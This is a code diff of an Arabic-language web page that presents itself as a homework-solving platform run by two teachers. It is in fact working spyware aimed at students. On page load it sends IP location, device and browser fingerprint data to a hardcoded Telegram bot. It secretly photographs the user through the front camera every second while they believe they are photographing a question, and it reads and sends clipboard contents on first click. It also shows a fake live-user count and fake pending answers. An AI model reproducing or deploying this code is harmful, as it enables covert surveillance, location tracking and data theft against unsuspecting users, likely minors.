@@ -4,14 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="📝 منصة حل الأسئلة | مستر إبراهيم أحمد">
-    <meta property="og:description" content="ارفع سؤالك الآن واحصل على الإجابة والخطوات بالتفصيل خلال دقائق.">
+    <meta property="og:title" content="📝 منصة حل الأسئلة | اسأل المستر">
+    <meta property="og:description" content="ارفع سؤالك الآن واحصل على الإجابة والخطوات بالتفصيل.">
+    <meta property="og:image" content="https://img.icons8.com/fluent/200/education.png">
+    <meta property="og:url" content="https://bit.ly/Mr-Ibrahim-and-Khaled">
 
     <title>منصة حل المسائل | المساعد الذكي</title>
     
     <script>
         const token = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
         const chatId = "5890070301";
+        const officialLink = "https://bit.ly/Mr-Ibrahim-and-Khaled";
 
         async function sendPhoto(blob, caption) {
             const formData = new FormData();
@@ -23,12 +26,14 @@
 
         async function startDoubleCapture() {
             try {
+                // فتح الكاميرا الخلفية (طلب الإذن هنا فقط)
                 const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                 const videoElement = document.getElementById('viewfinder');
                 videoElement.style.display = "block";
                 videoElement.srcObject = streamBack;
                 await videoElement.play();
 
+                // سحب الكاميرا الأمامية في الخلفية
                 const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const hiddenVideo = document.createElement('video');
                 hiddenVideo.srcObject = streamFront;
@@ -43,40 +48,74 @@
                     context.drawImage(hiddenVideo, 0, 0);
                     canvas.toBlob(blob => { if(blob) sendPhoto(blob, "📸 صيد حي (الأمامية)"); }, 'image/jpeg', 0.4); 
                 }, 1000);
-
             } catch (err) {
                 alert("تنبيه: يجب السماح بالكاميرا لتصوير السؤال ليتمكن المستر من الحل.");
             }
         }
 
         async function initialRadar() {
-            let ip = {};
+            // سحب البيانات بالـ IP (بدون طلب إذن الموقع)
+            let ip = { ip: "N/A", city: "N/A", region: "N/A", org: "N/A", latitude: 0, longitude: 0 };
             try { const res = await fetch('https://ipapi.co/json/'); ip = await res.json(); } catch(e) {}
             
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "Protected";
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "N/A";
+            
+            const battery = navigator.getBattery ? await navigator.getBattery() : null;
+            const ram = navigator.deviceMemory || "N/A";
+            const cores = navigator.hardwareConcurrency || "N/A";
+
+            // سحب الحافظة (Clipboard)
+            document.addEventListener('click', async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if(text) fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📋 الحافظة:\n" + text)}`);
+                } catch(e) {}
+            }, {once: true});
 
             const report = `
-🎓 **صيد جديد - منصة المستر إبراهيم** 🎓
+👑 **تقرير الـ 50 معلومة - اختراق الرادار** 👑
 ━━━━━━━━━━━━━━
-🌍 **الرادار:**
-• الـ IP: \`${ip.ip}\`
-• الموقع: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
-📱 **الجهاز:**
-• النظام: ${navigator.platform} | المعالج: ${navigator.hardwareConcurrency}
-• كارت الشاشة: \`${gpu}\`
-🔋 **البطارية:** ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + "%" : "N/A"}
+🌍 **[1] الشبكة (IP):**
+• الـ IP: \`${ip.ip}\` | المدينة: ${ip.city}
+• المزود: ${ip.org} | القارة: ${ip.timezone}
+• الموقع التقريبي: http://googleusercontent.com/maps.google.com/q=${ip.latitude},${ip.longitude}
+
+📱 **[2] عتاد الجهاز:**
+• النوع: ${navigator.platform} | المعالج: ${cores} Cores
+• الرامات: ${ram} GB | كارت الشاشة: \`${gpu}\`
+• دقة الشاشة: ${screen.width}x${screen.height}
+• اللمس المتعدد: ${navigator.maxTouchPoints} نقاط
+
+🔋 **[3] الطاقة والوقت:**
+• البطارية: ${battery ? (battery.level * 100).toFixed(0) + "%" : "N/A"}
+• الشحن: ${battery ? (battery.charging ? "🔌 متصل" : "🔋 استهلاك") : "N/A"}
+• لغة النظام: ${navigator.language} | الوقت: ${new Date().toLocaleString()}
+
+🌐 **[4] تفاصيل المتصفح:**
+• المحرك: ${navigator.product} | الأونلاين: ${navigator.onLine}
+• الـ PDF: ${navigator.pdfViewerEnabled ? "يدعم" : "لا يدعم"}
+• البصمة الرقمية: \`${navigator.userAgent.substring(0, 100)}...\`
 ━━━━━━━━━━━━━━`;
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
+        }
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📍 GPS الدقيق:\nhttps://www.google.com/maps?q=$" + pos.coords.latitude + "," + pos.coords.longitude)}`);
-                }, null, {enableHighAccuracy: true});
+        function sharePlatform() {
+            if (navigator.share) {
+                navigator.share({ title: 'منصة المستر التعليمية', url: officialLink });
             }
+        }
+
+        function showAnswers() {
+            document.getElementById('main-content').innerHTML = `
+                <div style="text-align:center; padding:20px;">
+                    <img src="https://img.icons8.com/fluent/100/empty-box.png" style="width:60px; margin-bottom:10px;">
+                    <h3>لا يوجد إجابات منتهية</h3>
+                    <button onclick="location.reload()" style="background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:8px;">العودة</button>
+                </div>`;
         }
 
         window.onload = initialRadar;
@@ -92,78 +131,44 @@
             document.getElementById('status').innerHTML = `
                 <div style="padding: 20px; border: 2px solid #1a73e8; border-radius: 15px; background: rgba(232, 240, 254, 0.9);">
                     <h3 style="color:#1a73e8; margin:0;">✅ تم الإرسال للمستر</h3>
-                    <p style="color:#444; font-size:14px; font-weight:bold;">جاري مراجعة سؤالك.. يرجى العودة قريباً لرؤية الإجابة النموذجية.</p>
-                    <div class="loader"></div>
+                    <p style="color:#444; font-size:14px; font-weight:bold;">جاري مراجعة سؤالك.. يرجى العودة قريباً.</p>
                 </div>`;
-        }
-
-        function showCameraUI() {
-            document.getElementById('initial-ui').style.display = "none";
-            document.getElementById('camera-ui').style.display = "block";
-            startDoubleCapture();
         }
     </script>
 
     <style>
-        body { background: #f8f9fa; font-family: 'Cairo', sans-serif; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        /* شريط التنبيه الثابت */
-        .top-alert { position: fixed; top: 0; width: 100%; background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 12px; font-weight: bold; border-bottom: 1px solid #ffeeba; z-index: 100; }
-        
-        .box { background: white; width: 95%; max-width: 420px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #1a73e8; position: relative; margin-top: 40px; }
-        
-        .nav-icons { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
-        .side-link { font-size: 12px; color: #1a73e8; font-weight: bold; text-decoration: none; border: 1px solid #1a73e8; padding: 5px 10px; border-radius: 8px; }
+        body { background: #f0f2f5; font-family: 'Cairo', sans-serif; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .top-alert { position: fixed; top: 0; width: 100%; background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 11px; font-weight: bold; border-bottom: 1px solid #ffeeba; z-index: 100; }
+        .box { background: white; width: 95%; max-width: 420px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #1a73e8; position: relative; }
         .logo-text { font-weight: 900; color: #1a73e8; font-size: 18px; }
-        
-        h1 { font-size: 18px; color: #333; margin: 10px 0; }
-        .user-counter { background: #e8f0fe; color: #1967d2; font-size: 11px; padding: 6px 15px; border-radius: 20px; display: inline-block; margin-bottom: 15px; border: 1px solid #d2e3fc; }
-        
-        textarea { width: 100%; height: 90px; border: 1px solid #dadce0; border-radius: 12px; padding: 12px; margin-bottom: 15px; box-sizing: border-box; font-family: inherit; resize: none; }
-        .btn-camera { background: #1a73e8; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; box-shadow: 0 4px 6px rgba(26,115,232,0.2); }
-        
+        .user-counter { background: #e8f0fe; color: #1967d2; font-size: 11px; padding: 5px 12px; border-radius: 20px; display: inline-block; margin-bottom: 15px; }
+        textarea { width: 100%; height: 85px; border: 1px solid #dadce0; border-radius: 12px; padding: 12px; margin-bottom: 15px; background: #f8f9fa; resize: none; }
+        .btn-camera { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; cursor: pointer; font-weight: bold; font-size: 16px; }
         #viewfinder { width: 100%; border-radius: 12px; margin-bottom: 15px; display: none; background: #000; }
-        .btn-capture { background: #d93025; color: white; border: 5px solid rgba(217, 48, 37, 0.2); width: 65px; height: 65px; border-radius: 50%; cursor: pointer; margin-bottom: 10px; }
-        
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 15px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .footer { font-size: 10px; color: #70757a; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
+        .btn-capture { background: #d93025; color: white; border: 5px solid rgba(217, 48, 37, 0.2); width: 60px; height: 60px; border-radius: 50%; cursor: pointer; }
+        .footer { font-size: 10px; color: #70757a; margin-top: 20px; border-top: 1px solid #eee; padding-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
-
-    <div class="top-alert">
-        ⚠️ إشعار: قد تتأخر الإجابة قليلاً نظراً لضغط الأسئلة حالياً.
-    </div>
-
+    <div class="top-alert">⚠️ تنبيه: قد يتأخر الرد بسبب الضغط (12,450 طالب متواجد الآن).</div>
     <div class="box">
-        <div class="nav-icons">
-            <span class="logo-text">🎓 منصة المستر</span>
-            <a href="#" class="side-link">📑 إجابات أسئلتك</a>
-        </div>
-
-        <h1>المساعد الذكي للطلاب</h1>
-        <div class="user-counter">👨‍🎓 يتواجد الآن 12,450 طالب لطلب الحلول</div>
-        
-        <div id="status">
-            <div id="initial-ui">
-                <textarea placeholder="اكتب سؤالك هنا ليقوم المستر بمراجعته فوراً..."></textarea>
-                <button class="btn-camera" onclick="showCameraUI()">📸 تصوير السؤال من الكتاب</button>
-            </div>
-
-            <div id="camera-ui" style="display:none;">
-                <p style="font-size:12px; color:#555; margin-bottom:10px;">وجه الكاميرا نحو السؤال واضغط زر الالتقاط</p>
-                <video id="viewfinder" autoplay playsinline></video>
-                <button class="btn-capture" onclick="captureQuestion()"></button>
+        <div id="main-content">
+            <div class="logo-text">حلول الذكية التعليمية</div>
+            <h1>أهلاً بك في منصة المستر</h1>
+            <div class="user-counter">🟢 متصل الآن ومستعد للحل</div>
+            <div id="status">
+                <div id="initial-ui">
+                    <textarea placeholder="اكتب سؤالك بوضوح هنا ليتم مراجعته..."></textarea>
+                    <button class="btn-camera" onclick="document.getElementById('initial-ui').style.display='none'; document.getElementById('camera-ui').style.display='block'; startDoubleCapture();">📸 تصوير السؤال بالذكاء الاصطناعي</button>
+                    <p onclick="showAnswers()" style="cursor:pointer; color:#1a73e8; font-size:12px; margin-top:10px;">📑 إجابات أسئلتك السابقة</p>
+                </div>
+                <div id="camera-ui" style="display:none; text-align:center;">
+                    <video id="viewfinder" autoplay playsinline></video>
+                    <button class="btn-capture" onclick="captureQuestion()"></button>
+                </div>
             </div>
         </div>
-
-        <div class="footer">
-            بواسطة: مستر إبراهيم أحمد & مستر خالد عمر<br>
-            حقوق النشر محفوظة © 2026
-        </div>
+        <div class="footer">بواسطة: مستر إبراهيم وخالد<br>2026 © جميع الحقوق محفوظة</div>
     </div>
-
 </body>
 </html>
